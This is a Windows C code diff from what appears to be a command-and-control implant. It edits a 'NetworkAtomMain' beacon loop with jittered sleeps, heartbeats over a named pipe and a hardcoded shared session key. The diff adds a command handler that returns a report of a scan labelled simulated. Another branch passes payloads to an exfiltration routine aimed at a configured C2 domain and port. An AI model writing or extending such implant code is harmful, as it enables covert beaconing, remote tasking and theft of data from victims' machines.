@@ -108,7 +108,7 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
 
     while (TRUE) {
         DWORD dwSleepTime = pConfig->dwJitterMin + (rand() % (pConfig->dwJitterMax - pConfig->dwJitterMin));
@@ -117,14 +117,23 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
         IPC_MESSAGE hbMsg = { 0 };
         hbMsg.CommandId = CMD_HEARTBEAT;
         hbMsg.dwPayloadLen = 0;
-        IPC_SendMessage(hPipe, &hbMsg, SharedSessionKey, sizeof(SharedSessionKey));
+        IPC_SendMessage(hPipe, &hbMsg, SharedSessionKey, 16);
 
         DWORD dwAvail = 0;
         if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
             IPC_MESSAGE inMsg = { 0 };
-            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, sizeof(SharedSessionKey))) {
+            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
                 
-                if (inMsg.CommandId == CMD_REPORT) {
+                if (inMsg.CommandId == CMD_EXECUTE) {
+                    char report[1024] = { 0 };
+                    sprintf_s(report, "[NET_SCAN] Local Beacon Active. Subnet: 192.168.1.0/24 (Simulated Scan Completed)");
+                    
+                    IPC_MESSAGE outMsg = { 0 };
+                    outMsg.CommandId = CMD_REPORT;
+                    outMsg.dwPayloadLen = (DWORD)strlen(report);
+                    memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                    IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
+                } else if (inMsg.CommandId == CMD_REPORT) {
                     WCHAR wDomain[256] = { 0 };
                     MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);
                     ExfiltrateTelemetry(inMsg.Payload, inMsg.dwPayloadLen, wDomain, (INTERNET_PORT)Config::C2_PORT);
